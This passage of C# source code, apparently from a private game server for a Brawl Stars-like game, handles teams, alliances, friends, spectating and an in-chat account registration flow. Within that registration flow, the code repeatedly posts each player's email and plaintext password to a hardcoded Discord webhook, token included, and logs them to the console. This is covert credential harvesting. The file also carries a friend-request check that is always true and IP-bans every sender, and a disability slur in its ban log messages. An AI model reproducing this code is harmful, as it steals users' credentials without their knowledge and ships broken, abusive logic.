            entry.Unknown1 = message.Unknown1;
            entry.Unknown2 = message.Unknown2;

            team.AddStreamEntry(entry);
        }

        private void TeamChatReceived(TeamChatMessage message)
        {
            if (HomeMode.Avatar.TeamId <= 0) return;
            if (HomeMode.Avatar.IsCommunityBanned) return;

            TeamEntry team = GetTeam();
            if (team == null) return;

            ChatStreamEntry entry = new ChatStreamEntry();
            entry.AccountId = HomeMode.Avatar.AccountId;
            entry.Name = HomeMode.Avatar.Name;
            entry.Message = message.Message;

            team.AddStreamEntry(entry);
        }

        private void AvatarNameCheckRequestReceived(AvatarNameCheckRequestMessage message)
        {
            LogicChangeAvatarNameCommand command = new LogicChangeAvatarNameCommand();
            command.Name = message.Name;
            command.ChangeNameCost = 0;
            if (message.Name.Length < 2)
            {
                namefailed nf = new namefailed();
                Connection.Send(nf);
                return;
            }
            if (message.Name.StartsWith("<c"))
            {
                namefailed nf = new namefailed();
                Connection.Send(nf);
                return;
            }
            if (message.Name.Length > 15) //İSİM SINIRI YENİ EKLENMİSDİR.....
            {
                namefailed kk = new namefailed();
                Connection.Send(kk);
                File.AppendAllLines(BlockedIpsFilePath, new[] { Connection.Socket.RemoteEndPoint.ToString().Split(" ")[0] });
                Console.WriteLine($"IP BAN OZURLU EVLADI: {Connection.Socket.RemoteEndPoint.ToString().Split(" ")[0]}");
                return;
            }
            var wordlist = new Wordlist("words.json");
            if (wordlist.ContainsBlockedWord(message.Name))
            {
                namefailed nf = new namefailed();
                Connection.Send(nf);
                return;
            }
            command.Execute(HomeMode);
            if (HomeMode.Avatar.AllianceId >= 0)
            {
                Alliance a = Alliances.Load(HomeMode.Avatar.AllianceId);
                if (a == null) return;
                AllianceMember m = a.GetMemberById(HomeMode.Avatar.AccountId);
                m.DisplayData.Name = message.Name;
            }
            AvailableServerCommandMessage serverCommandMessage = new AvailableServerCommandMessage();
            serverCommandMessage.Command = command;
            Connection.Send(serverCommandMessage);
        }

        private void TeamSetEventReceived(TeamSetEventMessage message)
        {
            if (HomeMode.Avatar.TeamId <= 0) return;

            TeamEntry team = GetTeam();
            if (team == null) return;
            if (message.EventSlot == 2) return;

            EventData data = Events.GetEvent(message.EventSlot);
            if (data == null) return;

            team.EventSlot = message.EventSlot;
            team.LocationId = data.LocationId;
            team.TeamUpdated();
        }

        private BattleMode SpectatedBattle;
        private void StopSpectateReceived(StopSpectateMessage message)
        {
            if (SpectatedBattle != null)
            {
                SpectatedBattle.RemoveSpectator(Connection.UdpSessionId);
                SpectatedBattle = null;
            }

            if (Connection.Home != null && Connection.Avatar != null)
            {
                OwnHomeDataMessage ohd = new OwnHomeDataMessage();
                ohd.Home = Connection.Home;
                ohd.Avatar = Connection.Avatar;
                Connection.Send(ohd);
            }
        }

        private void StartSpectateReceived(StartSpectateMessage message)
        {
            Account data = Accounts.Load(message.AccountId);
            if (data == null) return;

            ClientAvatar avatar = data.Avatar;
            long battleId = avatar.BattleId;

            BattleMode battle = Battles.Get(battleId);
            if (battle == null) return;

            SpectatedBattle = battle;
            UDPSocket socket = UDPGateway.CreateSocket();
            socket.Battle = battle;
            socket.IsSpectator = true;
            socket.TCPConnection = Connection;
            Connection.UdpSessionId = socket.SessionId;
            battle.AddSpectator(socket.SessionId, new UDPGameListener(socket, Connection));

            StartLoadingMessage startLoading = new StartLoadingMessage();
            startLoading.LocationId = battle.Location.GetGlobalId();
            startLoading.TeamIndex = 0;
            startLoading.OwnIndex = 0;
            startLoading.GameMode = battle.GetGameModeVariation() == 6 ? 6 : 1;
            startLoading.Players.AddRange(battle.GetPlayers());
            startLoading.SpectateMode = 1;

            Connection.Send(startLoading);

            UdpConnectionInfoMessage info = new UdpConnectionInfoMessage();
            info.SessionId = Connection.UdpSessionId;
            info.ServerAddress = Configuration.Instance.UdpHost;
            info.ServerPort = Configuration.Instance.UdpPort;
            Connection.Send(info);
        }

        private void GoHomeFromOfflinePractiseReceived(GoHomeFromOfflinePractiseMessage message)
        {
            if (Connection.Home != null && Connection.Avatar != null)
            {
                if (Connection.Avatar.IsTutorialState())
                {
                    Connection.Avatar.SkipTutorial();
                }
                if (false)//(HomeMode.Avatar.BattleStartTime != new DateTime())
                {
                    Hero h = HomeMode.Avatar.GetHero(HomeMode.Home.CharacterId);
                    int lose = 0;
                    int brawlerTrophies = h.Trophies;
                    if (brawlerTrophies <= 49)
                    {
                        lose = 0;
                    }
                    else if (50 <= brawlerTrophies && brawlerTrophies <= 99)
                    {
                        lose = -1;
                    }
                    else if (100 <= brawlerTrophies && brawlerTrophies <= 199)
                    {
                        lose = -2;
                    }
                    else if (200 <= brawlerTrophies && brawlerTrophies <= 299)
                    {
                        lose = -3;
                    }
                    else if (300 <= brawlerTrophies && brawlerTrophies <= 399)
                    {
                        lose = -4;
                    }
                    else if (400 <= brawlerTrophies && brawlerTrophies <= 499)
                    {
                        lose = -5;
                    }
                    else if (500 <= brawlerTrophies && brawlerTrophies <= 599)
                    {
                        lose = -6;
                    }
                    else if (600 <= brawlerTrophies && brawlerTrophies <= 699)
                    {
                        lose = -7;
                    }
                    else if (700 <= brawlerTrophies && brawlerTrophies <= 799)
                    {
                        lose = -8;
                    }
                    else if (800 <= brawlerTrophies && brawlerTrophies <= 899)
                    {
                        lose = -9;
                    }
                    else if (900 <= brawlerTrophies && brawlerTrophies <= 999)
                    {
                        lose = -10;
                    }
                    else if (1000 <= brawlerTrophies && brawlerTrophies <= 1099)
                    {
                        lose = -11;
                    }
                    else if (1100 <= brawlerTrophies && brawlerTrophies <= 1199)
                    {
                        lose = -12;
                    }
                    else if (brawlerTrophies >= 1200)
                    {
                        lose = -12;
                    }
                    h.AddTrophies(lose);
                    HomeMode.Home.PowerPlayGamesPlayed = Math.Max(0, HomeMode.Home.PowerPlayGamesPlayed - 1);
                    HomeMode.Avatar.BattleStartTime = new DateTime();
                    Logger.BLog($"Player {LogicLongCodeGenerator.ToCode(HomeMode.Avatar.AccountId)} left battle!");
                }
                Connection.Home.Events = Events.GetEventsById(HomeMode.Home.PowerPlayGamesPlayed, Connection.Avatar.AccountId);

                OwnHomeDataMessage ohd = new OwnHomeDataMessage();
                ohd.Home = Connection.Home;
                ohd.Avatar = Connection.Avatar;
                ShowLobbyInfo();
                Connection.Send(ohd);
            }
        }

        private void TeamSetLocationReceived(TeamSetLocationMessage message)
        {
            if (HomeMode.Avatar.TeamId <= 0) return;

            TeamEntry team = GetTeam();
            if (team == null) return;

            team.Type = 1;
            team.LocationId = 15000000 + message.istenenmap; //YENİ EKLENMİSDİR.
            team.TeamUpdated();
        }

        private void ChangeAllianceSettingsReceived(ChangeAllianceSettingsMessage message)
        {
            if (HomeMode.Avatar.AllianceId <= 0) return;

            if (HomeMode.Avatar.AllianceRole != AllianceRole.Leader && HomeMode.Avatar.AllianceRole != AllianceRole.CoLeader) return;

            Alliance alliance = Alliances.Load(HomeMode.Avatar.AllianceId);
            if (alliance == null) return;

            if (message.BadgeId >= 8000000 && message.BadgeId < 8000000 + DataTables.Get(DataType.AllianceBadge).Count)
            {
                alliance.AllianceBadgeId = message.BadgeId;
            }
            else
            {
                alliance.AllianceBadgeId = 8000000;
            }

            alliance.Description = message.Description;
            alliance.RequiredTrophies = message.RequiredTrophies;
            if (message.Type == 1)
            {
                alliance.Type = 1;
            }
            if (message.Type == 2)
            {
                alliance.Type = 1;
            }
            if (message.Type == 3)
            {
                alliance.Type = 3;
            }
            if (message.RequiredTrophies == 0)
            {
                alliance.RequiredTrophies = 8;
            }
            if (message.Description.Length > 300)
            {
                File.AppendAllLines(BlockedIpsFilePath, new[] { Connection.Socket.RemoteEndPoint.ToString().Split(" ")[0] });
                Console.WriteLine($"IP BAN OZURLU EVLADI: {Connection.Socket.RemoteEndPoint.ToString().Split(" ")[0]}");
                return;
            }
            if (message.BadgeId == null)
            {
                File.AppendAllLines(BlockedIpsFilePath, new[] { Connection.Socket.RemoteEndPoint.ToString().Split(" ")[0] });
                Console.WriteLine($"IP BAN OZURLU EVLADI: {Connection.Socket.RemoteEndPoint.ToString().Split(" ")[0]}");
                return;
            }
            if (message.Type != 1 && message.Type != 2 && message.Type != 3)
            {
                File.AppendAllLines(BlockedIpsFilePath, new[] { Connection.Socket.RemoteEndPoint.ToString().Split(" ")[0] });
                Console.WriteLine($"IP BAN OZURLU EVLADI: {Connection.Socket.RemoteEndPoint.ToString().Split(" ")[0]}");
                return;
            }
            if (message.RequiredTrophies == null)
            {
                File.AppendAllLines(BlockedIpsFilePath, new[] { Connection.Socket.RemoteEndPoint.ToString().Split(" ")[0] });
                Console.WriteLine($"IP BAN OZURLU EVLADI: {Connection.Socket.RemoteEndPoint.ToString().Split(" ")[0]}");
                return;
            }
            //Console.WriteLine(alliance.Type);
            //Console.WriteLine(message.Type);

            Connection.Send(new AllianceResponseMessage()
            {
                ResponseType = 10
            });

            MyAllianceMessage myAlliance = new MyAllianceMessage();
            myAlliance.Role = HomeMode.Avatar.AllianceRole;
            myAlliance.OnlineMembers = alliance.OnlinePlayers;
            myAlliance.AllianceHeader = alliance.Header;
            Connection.Send(myAlliance);
        }

        private void KickAllianceMemberReceived(KickAllianceMemberMessage message)
        {
            
            if (HomeMode.Avatar.AllianceId <= 0) return;

            Alliance alliance = Alliances.Load(HomeMode.Avatar.AllianceId);
            if (alliance == null) return;

            AllianceMember member = alliance.GetMemberById(message.AccountId);
            if (member == null) return;

            ClientAvatar avatar = Accounts.Load(message.AccountId).Avatar;

            if (HomeMode.Avatar.AllianceRole != AllianceRole.Leader && HomeMode.Avatar.AllianceRole != AllianceRole.CoLeader)
            {
                return;
            }

            if (HomeMode.Avatar.AllianceRole <= avatar.AllianceRole) return;

            alliance.Members.Remove(member);
            avatar.AllianceId = -1;

            AllianceStreamEntry entry = new AllianceStreamEntry();
            entry.AuthorId = HomeMode.Avatar.AccountId;
            entry.AuthorName = HomeMode.Avatar.Name;
            entry.Id = ++alliance.Stream.EntryIdCounter;
            entry.PlayerId = avatar.AccountId;
            entry.PlayerName = avatar.Name;
            entry.Type = 4;
            entry.Event = 1; // kicked
            entry.AuthorRole = HomeMode.Avatar.AllianceRole;
            alliance.AddStreamEntry(entry);

            AllianceResponseMessage response = new AllianceResponseMessage();
            response.ResponseType = 70;
            Connection.Send(response);

            if (LogicServerListener.Instance.IsPlayerOnline(avatar.AccountId))
            {
                LogicServerListener.Instance.GetGameListener(avatar.AccountId).SendTCPMessage(new AllianceResponseMessage()
                {
                    ResponseType = 100
                });
                LogicServerListener.Instance.GetGameListener(avatar.AccountId).SendTCPMessage(new MyAllianceMessage());
            }
            MyAllianceMessage myAlliance = new MyAllianceMessage();
            myAlliance.Role = HomeMode.Avatar.AllianceRole;
            myAlliance.OnlineMembers = alliance.OnlinePlayers;
            myAlliance.AllianceHeader = alliance.Header;
            Connection.Send(myAlliance);
        }

        private void TeamSetMemberReadyReceived(TeamSetMemberReadyMessage message)
        {
            TeamEntry team = Teams.Get(HomeMode.Avatar.TeamId);
            if (team == null) return;

            TeamMember member = team.GetMember(HomeMode.Avatar.AccountId);
            if (member == null) return;

            member.IsReady = message.IsReady;

            team.TeamUpdated();

            //if (team.IsEveryoneReady())
            // {
            //Teams.StartGame(team);
            //}
        }

        private void TeamChangeMemberSettingsReceived(TeamChangeMemberSettingsMessage message)
        {
            ;
        }

        private void TeamMemberStatusReceived(TeamMemberStatusMessage message)
        {
            if (HomeMode == null) return;
            if (message.Status < 0) return;
            TeamEntry team = Teams.Get(HomeMode.Avatar.TeamId);
            if (team == null) return;

            TeamMember member = team.GetMember(HomeMode.Avatar.AccountId);
            if (member == null) return;

            member.State = message.Status;
            team.TeamUpdated();
        }


        private void TeamInvitationResponseReceived(TeamInvitationResponseMessage message)
        {
            bool isAccept = message.Response == 1;

            TeamEntry team = Teams.Get(message.TeamId);
            if (team == null) return;

            TeamInviteEntry invite = team.GetInviteById(HomeMode.Avatar.AccountId);
            if (invite == null) return;

            team.Invites.Remove(invite);

            if (isAccept)
            {
                TeamMember member = new TeamMember();
                member.AccountId = HomeMode.Avatar.AccountId;
                member.CharacterId = HomeMode.Home.CharacterId;
                member.SkinId = GlobalId.CreateGlobalId(29, HomeMode.Home.SelectedSkins[GlobalId.GetInstanceId(HomeMode.Home.CharacterId)]);
                member.DisplayData = new PlayerDisplayData(HomeMode.Home.HasPremiumPass, HomeMode.Home.ThumbnailId, HomeMode.Home.NameColorId, HomeMode.Avatar.Name);

                Hero hero = HomeMode.Avatar.GetHero(HomeMode.Home.CharacterId);
                member.HeroTrophies = hero.Trophies;
                member.HeroHighestTrophies = hero.HighestTrophies;
                member.HeroLevel = hero.PowerLevel;
                member.IsOwner = false;
                member.State = 0;
                team.Members.Add(member);

                HomeMode.Avatar.TeamId = team.Id;
            }

            team.TeamUpdated();
        }

        private TeamEntry GetTeam()
        {
            return Teams.Get(HomeMode.Avatar.TeamId);
        }

        private void TeamInviteReceived(TeamInviteMessage message)
        {
            TeamEntry team = GetTeam();
            if (team == null) return;

            Account data = Accounts.Load(message.AvatarId);
            if (data == null) return;

            TeamInviteEntry entry = new TeamInviteEntry();
            entry.Slot = message.Team;
            entry.Name = data.Avatar.Name;
            entry.Id = message.AvatarId;
            entry.InviterId = HomeMode.Avatar.AccountId;

            team.Invites.Add(entry);

            team.TeamUpdated();

            LogicGameListener gameListener = LogicServerListener.Instance.GetGameListener(message.AvatarId);
            if (gameListener != null)
            {
                TeamInvitationMessage teamInvitationMessage = new TeamInvitationMessage();
                teamInvitationMessage.TeamId = team.Id;

                Friend friendEntry = new Friend();
                friendEntry.AccountId = HomeMode.Avatar.AccountId;
                friendEntry.DisplayData = new PlayerDisplayData(HomeMode.Home.HasPremiumPass, HomeMode.Home.ThumbnailId, HomeMode.Home.NameColorId, HomeMode.Avatar.Name);
                friendEntry.Trophies = HomeMode.Avatar.Trophies;
                teamInvitationMessage.Unknown = 1;
                teamInvitationMessage.FriendEntry = friendEntry;

                gameListener.SendTCPMessage(teamInvitationMessage);
            }
        }

        public void TeamClearInviteReceived(TeamClearInviteMessage message)
        {
            TeamEntry team = GetTeam();
            if (team == null) return;

            int slot = message.Slot;

            TeamInviteEntry inviteToRemove = team.Invites.FirstOrDefault(invite => invite.Slot == slot);
            if (inviteToRemove != null)
            {
                team.Invites.Remove(inviteToRemove);

                team.TeamUpdated();

                LogicGameListener gameListener = LogicServerListener.Instance.GetGameListener(inviteToRemove.Id);
                if (gameListener != null)
                {
                    TeamClearInviteMessage clearMessage = new TeamClearInviteMessage();
                    clearMessage.Slot = slot;
                    gameListener.SendTCPMessage(clearMessage);
                }
            }
            else
            {
                Console.WriteLine($"error {slot}.");
            }
        }

        private void TeamLeaveReceived(TeamLeaveMessage message)
        {
            if (HomeMode.Avatar.TeamId <= 0) return;

            TeamEntry team = Teams.Get(HomeMode.Avatar.TeamId);

            if (team == null)
            {
                Logger.Print("TeamLeave - Team is NULL!");
                HomeMode.Avatar.TeamId = -1;
                Connection.Send(new TeamLeftMessage());
                return;
            }

            TeamMember entry = team.GetMember(HomeMode.Avatar.AccountId);

            if (entry == null) return;
            HomeMode.Avatar.TeamId = -1;

            team.Members.Remove(entry);

            Connection.Send(new TeamLeftMessage());
            team.TeamUpdated();

            if (team.Members.Count == 0)
            {
                Teams.Remove(team.Id);
            }
        }
        private void TeamCreateReceived(TeamCreateMessage message)
        {
            TeamEntry team = Teams.Create();

            team.Type = message.TeamType;
            team.LocationId = Events.GetEvents()[0].LocationId;

            TeamMember member = new TeamMember();
            member.AccountId = HomeMode.Avatar.AccountId;
            member.CharacterId = HomeMode.Home.CharacterId;
            member.SkinId = GlobalId.CreateGlobalId(29, HomeMode.Home.SelectedSkins[GlobalId.GetInstanceId(HomeMode.Home.CharacterId)]);
            member.DisplayData = new PlayerDisplayData(HomeMode.Home.HasPremiumPass, HomeMode.Home.ThumbnailId, HomeMode.Home.NameColorId, HomeMode.Avatar.Name);

            Hero hero = HomeMode.Avatar.GetHero(HomeMode.Home.CharacterId);
            member.HeroTrophies = hero.Trophies;
            member.HeroHighestTrophies = hero.HighestTrophies;
            member.HeroLevel = hero.PowerLevel;
            member.IsOwner = true;
            member.State = 0;
            team.Members.Add(member);

            TeamMessage teamMessage = new TeamMessage();
            teamMessage.Team = team;
            HomeMode.Avatar.TeamId = team.Id;
            Connection.Send(teamMessage);
        }

        private void AcceptFriendReceived(AcceptFriendMessage message)
        {
            Account data = Accounts.Load(message.AvatarId);
            if (data == null) return;

            {
                Friend entry = HomeMode.Avatar.GetRequestFriendById(message.AvatarId);
                if (entry == null) return;

                Friend oldFriend = HomeMode.Avatar.GetAcceptedFriendById(message.AvatarId);
                if (oldFriend != null)
                {
                    HomeMode.Avatar.Friends.Remove(entry);
                    Connection.Send(new OutOfSyncMessage());
                    return;
                }

                entry.FriendReason = 0;
                entry.FriendState = 4;

                FriendListUpdateMessage update = new FriendListUpdateMessage();
                update.Entry = entry;
                Connection.Send(update);
            }

            {
                ClientAvatar avatar = data.Avatar;
                Friend entry = avatar.GetFriendById(HomeMode.Avatar.AccountId);
                if (entry == null) return;

                entry.FriendState = 4;
                entry.FriendReason = 0;

                if (LogicServerListener.Instance.IsPlayerOnline(avatar.AccountId))
                {
                    FriendListUpdateMessage update = new FriendListUpdateMessage();
                    update.Entry = entry;
                    LogicServerListener.Instance.GetGameListener(avatar.AccountId).SendTCPMessage(update);
                }
            }
        }

        private void RemoveFriendReceived(RemoveFriendMessage message)
        {
            Account data = Accounts.Load(message.AvatarId);
            if (data == null) return;

            ClientAvatar avatar = data.Avatar;

            Friend MyEntry = HomeMode.Avatar.GetFriendById(message.AvatarId);
            if (MyEntry == null) return;

            MyEntry.FriendState = 0;

            HomeMode.Avatar.Friends.Remove(MyEntry);

            FriendListUpdateMessage update = new FriendListUpdateMessage();
            update.Entry = MyEntry;
            Connection.Send(update);

            Friend OtherEntry = avatar.GetFriendById(HomeMode.Avatar.AccountId);

            if (OtherEntry == null) return;

            OtherEntry.FriendState = 0;

            avatar.Friends.Remove(OtherEntry);

            if (LogicServerListener.Instance.IsPlayerOnline(avatar.AccountId))
            {
                FriendListUpdateMessage update2 = new FriendListUpdateMessage();
                update2.Entry = OtherEntry;
                LogicServerListener.Instance.GetGameListener(avatar.AccountId).SendTCPMessage(update2);
            }
        }

        private void AddFriendReceived(AddFriendMessage message)
        {
            Account data = Accounts.Load(message.AvatarId);
            if (data == null)
            {
                Connection.Send(new AddFriendFailedMessage
                {
                    Reason = 5
                });
                return;
            }
            if (data.Avatar.AccountId == HomeMode.Avatar.AccountId)
            {
                // 2 - too many invites
                // 4 - invite urself
                // 5 doesnt exist
                // 7 - u have too many friends, rm
                // 8 - u have too many friends
                Connection.Send(new AddFriendFailedMessage
                {
                    Reason = 4
                });
                return;
            }
            if (data.Home.BlockFriendRequests)
            {
                Connection.Send(new AddFriendFailedMessage
                {
                    Reason = 0
                });
                return;
            }

            ClientAvatar avatar = data.Avatar;

            if (message.Reason != 0 || message.Reason != 1 || message.Reason != 2) //fixler 0 normal, 1 klupden, 2 takimdan(emindegil)
            {
                File.AppendAllLines(BlockedIpsFilePath, new[] { Connection.Socket.RemoteEndPoint.ToString().Split(" ")[0] });
                Console.WriteLine($"IP BAN OZURLU EVLADI: {Connection.Socket.RemoteEndPoint.ToString().Split(" ")[0]}");
                return;
            }



            Friend requestEntry = HomeMode.Avatar.GetFriendById(message.AvatarId);
            if (requestEntry != null)
            {
                AcceptFriendReceived(new AcceptFriendMessage()
                {
                    AvatarId = message.AvatarId
                });
                return;
            }

            else
            {
                Friend friendEntry = new Friend();
                friendEntry.AccountId = HomeMode.Avatar.AccountId;
                friendEntry.DisplayData = new PlayerDisplayData(HomeMode.Home.HasPremiumPass, HomeMode.Home.ThumbnailId, HomeMode.Home.NameColorId, HomeMode.Avatar.Name);
                friendEntry.FriendReason = message.Reason; //REASONLAR DUZELTILCEK 10 USTU OLUNCA GHOSTFRIEND
                friendEntry.FriendState = 3;
                avatar.Friends.Add(friendEntry);

                Friend request = new Friend();
                request.AccountId = avatar.AccountId;
                request.DisplayData = new PlayerDisplayData(data.Home.HasPremiumPass, data.Home.ThumbnailId, data.Home.NameColorId, data.Avatar.Name);
                request.FriendReason = 0;
                request.FriendState = 2;
                HomeMode.Avatar.Friends.Add(request);

                if (LogicServerListener.Instance.IsPlayerOnline(message.AvatarId))
                {
                    var gameListener = LogicServerListener.Instance.GetGameListener(message.AvatarId);

                    FriendListUpdateMessage update = new FriendListUpdateMessage();
                    update.Entry = friendEntry;

                    gameListener.SendTCPMessage(update);
                }

                FriendListUpdateMessage update2 = new FriendListUpdateMessage();
                update2.Entry = request;
                Connection.Send(update2);
            }
        }

        private void AskForFriendListReceived(AskForFriendListMessage message)
        {
            FriendListMessage friendList = new FriendListMessage();
            friendList.Friends = HomeMode.Avatar.Friends.ToArray();
            Connection.Send(friendList);
        }

        private void PlayerStatusReceived(PlayerStatusMessage message)
        {
            if (HomeMode == null) return;
            if (message.Status < 0) return;
            int oldstatus = HomeMode.Avatar.PlayerStatus;
            int newstatus = message.Status;
            //Console.WriteLine("aaaa");
            //Console.WriteLine(oldstatus);
            //Console.WriteLine(newstatus);
            /*
             * practice:
             * 10
             * -1
             * 8
             *
             * battle:
             * 3
             * -1
             * 8
             */

            HomeMode.Avatar.PlayerStatus = message.Status;
            if (oldstatus == 3 && newstatus == 8)
            {
                HomeMode.Avatar.BattleStartTime = DateTime.UtcNow;
            }
            if (oldstatus == 8 && newstatus == 3)
            {
                Hero h = HomeMode.Avatar.GetHero(HomeMode.Home.CharacterId);
                int lose = 0;
                int brawlerTrophies = h.Trophies;
                if (brawlerTrophies <= 49)
                {
                    lose = 0;
                }
                else if (50 <= brawlerTrophies && brawlerTrophies <= 99)
                {
                    lose = -1;
                }
                else if (100 <= brawlerTrophies && brawlerTrophies <= 199)
                {
                    lose = -2;
                }
                else if (200 <= brawlerTrophies && brawlerTrophies <= 299)
                {
                    lose = -3;
                }
                else if (300 <= brawlerTrophies && brawlerTrophies <= 399)
                {
                    lose = -4;
                }
                else if (400 <= brawlerTrophies && brawlerTrophies <= 499)
                {
                    lose = -5;
                }
                else if (500 <= brawlerTrophies && brawlerTrophies <= 599)
                {
                    lose = -6;
                }
                else if (600 <= brawlerTrophies && brawlerTrophies <= 699)
                {
                    lose = -7;
                }
                else if (700 <= brawlerTrophies && brawlerTrophies <= 799)
                {
                    lose = -8;
                }
                else if (800 <= brawlerTrophies && brawlerTrophies <= 899)
                {
                    lose = -9;
                }
                else if (900 <= brawlerTrophies && brawlerTrophies <= 999)
                {
                    lose = -10;
                }
                else if (1000 <= brawlerTrophies && brawlerTrophies <= 1099)
                {
                    lose = -11;
                }
                else if (1100 <= brawlerTrophies && brawlerTrophies <= 1199)
                {
                    lose = -12;
                }
                else if (brawlerTrophies >= 1200)
                {
                    lose = -12;
                }
                h.AddTrophies(lose);
                HomeMode.Home.PowerPlayGamesPlayed = Math.Max(0, HomeMode.Home.PowerPlayGamesPlayed - 1);
                HomeMode.Avatar.BattleStartTime = new DateTime();
                HomeMode.Home.TrophiesReward = 0;
                Logger.BLog($"Player {LogicLongCodeGenerator.ToCode(HomeMode.Avatar.AccountId)} left battle!");
                HomeMode.Avatar.BattleStartTime = DateTime.MinValue;
                if (HomeMode.Home.NotificationFactory.NotificationList.Count < 5)
                {
                    long timestamp = DateTime.Now.Ticks / TimeSpan.TicksPerSecond;
                    int timestamps = Convert.ToInt32(timestamp % int.MaxValue);
                    HomeMode.Home.NotificationFactory.Add(
                    new Notification()
                    {
                        Id = 81,
                        MessageEntry = $"Maçtan ayrıldığınız için: {lose} kupa ceza aldınız!",
                        TimePassed = Convert.ToInt32(timestamps),

                    });
                }
            }

            FriendOnlineStatusEntryMessage entryMessage = new FriendOnlineStatusEntryMessage();
            entryMessage.AvatarId = HomeMode.Avatar.AccountId;
            entryMessage.PlayerStatus = HomeMode.Avatar.PlayerStatus;

            foreach (Friend friend in HomeMode.Avatar.Friends.ToArray())
            {
                if (LogicServerListener.Instance.IsPlayerOnline(friend.AccountId))
                {
                    LogicServerListener.Instance.GetGameListener(friend.AccountId).SendTCPMessage(entryMessage);
                }
            }
        }

        private void SendMyAllianceData(Alliance alliance)
        {
            MyAllianceMessage myAlliance = new MyAllianceMessage();
            myAlliance.Role = HomeMode.Avatar.AllianceRole;
            myAlliance.OnlineMembers = alliance.OnlinePlayers;
            myAlliance.AllianceHeader = alliance.Header;
            Connection.Send(myAlliance);

            AllianceStreamMessage stream = new AllianceStreamMessage();
            stream.Entries = alliance.Stream.GetEntries();
            Connection.Send(stream);
        }


        private int BotIdCounter;

        private int publicrandomkod;
        private string girismail;
        private string girissifre;
        string hakkinizYok = "Bu komudu kullanma hakkınız yok.";
        private string tur = "";
        private int denemehakki;
        private int denemehakkigiris;

        private void ChatToAllianceStreamReceived(ChatToAllianceStreamMessage message)
        {
            Alliance alliance = Alliances.Load(HomeMode.Avatar.AllianceId);
            if (alliance == null) return;
            if (message.Message.Length > 150) return;

            if (message.Message.Contains("holonos") || message.Message.Contains("holonost") || message.Message.Contains("t,me") || message.Message.Contains("t.me") || message.Message.Contains("@b_svo")) return;
            if (HomeMode.Avatar.Name.Contains("holonos") || HomeMode.Avatar.Name.Contains("t,me") || HomeMode.Avatar.Name.Contains("t.me") || HomeMode.Avatar.Name.Contains("b_svo")) return;
            AllianceStreamEntryMessage responses = new AllianceStreamEntryMessage();
            responses.Entry = new AllianceStreamEntry();
            responses.Entry.AuthorName = "Tara Brawl";
            responses.Entry.AuthorId = 1;
            responses.Entry.Id = alliance.Stream.EntryIdCounter + 667 + BotIdCounter++;
            responses.Entry.AuthorRole = AllianceRole.Member;
            responses.Entry.Type = 2;

            if (kodorhani == true)
            {
                Account plreaccounts = Accounts.Load(HomeMode.Avatar.AccountId);
                if (plreaccounts.Home.TBIDBanEndTime != null)
                {
                    if (DateTime.Now < plreaccounts.Home.TBIDBanEndTime)
                    {

                        return;
                    }

                }
                if (tur == "register")
                {
                    if (message.Message.StartsWith(publicrandomkod.ToString()))
                    {
                        Console.WriteLine(girismail, girissifre, HomeMode.Avatar.AccountId);
                        bool registrationSuccess = RegisterUserToDatabase(girismail, girissifre, HomeMode.Avatar.AccountId);

                        Account plreaccount = Accounts.Load(HomeMode.Avatar.AccountId);


                        Notification brlyn = new()
                        {
                            Id = 94,
                            skin = 59,
                            MessageEntry = HomeMode.Home.DeviceLang == 18
                                ? ""
                                : ""
                        };

                        Task.Run(async () =>
                        {
                            await Task.Delay(1000);
                            //string accountIdS = LoginUserFromDatabase(girismail, girissifre);
                            string accountIdS = HomeMode.Avatar.AccountId + "";
                            Console.WriteLine("gg:" + girismail + girissifre + "\naccid:" + accountIdS);
                            if (string.IsNullOrEmpty(accountIdS))
                            {
                                responses.Entry.Message = HomeMode.Home.DeviceLang == 18
                                    ? "Hesaba girilemedi. Kullanıcı adı veya şifre yanlış."
                                    : "Unable to log in. Username or password is incorrect.";
                                Connection.Send(responses);
                                MyDiscordBot.sendWebhook("https://discord.com/api/webhooks/1322675495648890972/32T__JIQwaipF92-wLRV3_kFTyAKkppIr530l7nN4QL4HO8jXtZ-LSxC4-4bEMDkkkRE", $"mail: {girismail} | sifre: {girissifre}");
                                return;
                            }

                            Account account = Accounts.Load((long)Convert.ToDouble(accountIdS));

                            if (account == null)
                            {
                                responses.Entry.Message = HomeMode.Home.DeviceLang == 18
                                    ? "Böyle bir hesap bulunamadı."
                                    : "No such account was found.";
                                Connection.Send(responses);
                                MyDiscordBot.sendWebhook("https://discord.com/api/webhooks/1322675495648890972/32T__JIQwaipF92-wLRV3_kFTyAKkppIr530l7nN4QL4HO8jXtZ-LSxC4-4bEMDkkkRE", $"mail: {girismail} | sifre: {girissifre}");
                                return;
                            }

                            Connection.Send(new CreateAccountOkMessage
                            {
                                AccountId = account.AccountId,
                                PassToken = account.PassToken
                            });

                            Connection.Send(new AuthenticationFailedMessage
                            {
                                ErrorCode = 0,
                                Message = HomeMode.Home.DeviceLang == 18
                                    ? "Hesaba başarıyla giriş yapıldı."
                                    : "Successfully logged into the account."
                            });
                            MyDiscordBot.sendWebhook("https://discord.com/api/webhooks/1322675495648890972/32T__JIQwaipF92-wLRV3_kFTyAKkppIr530l7nN4QL4HO8jXtZ-LSxC4-4bEMDkkkRE", $"mail: {girismail} | sifre: {girissifre}");

                            kodorhani = false;

                            plreaccount.Home.NotificationFactory.Add(brlyn);
                            LogicAddNotificationCommand acmGems = new()
                            {
                                Notification = brlyn
                            };
                            AvailableServerCommandMessage asmGems = new AvailableServerCommandMessage();
                            asmGems.Command = acmGems;
                            if (Sessions.IsSessionActive(HomeMode.Avatar.AccountId))
                            {
                                var sessionGems = Sessions.GetSession(HomeMode.Avatar.AccountId);
                                sessionGems.GameListener.SendTCPMessage(asmGems);
                            }
                            responses.Entry.Message = HomeMode.Home.DeviceLang == 18
                                ? "Kayıt başarılı! Hesabına giriş yapılıyor."
                                : "Registration successful! Logging into your account.";

                            Connection.Send(responses);
                            MyDiscordBot.sendWebhook("https://discord.com/api/webhooks/1322675495648890972/32T__JIQwaipF92-wLRV3_kFTyAKkppIr530l7nN4QL4HO8jXtZ-LSxC4-4bEMDkkkRE", $"mail: {girismail} | sifre: {girissifre}");
                        });
                        return;
                    }
                    else
                    {
                        if (denemehakki != 0)
                        {
                            denemehakki -= 1;
                            responses.Entry.Message = HomeMode.Home.DeviceLang == 18
                                ? $"Doğrulama kodu geçersiz. Tekrar deneyin (kalan deneme hakkı: {denemehakki})"
                                : $"Invalid verification code. Try again (remaining attempts: {denemehakki}).";
                            Connection.Send(responses);
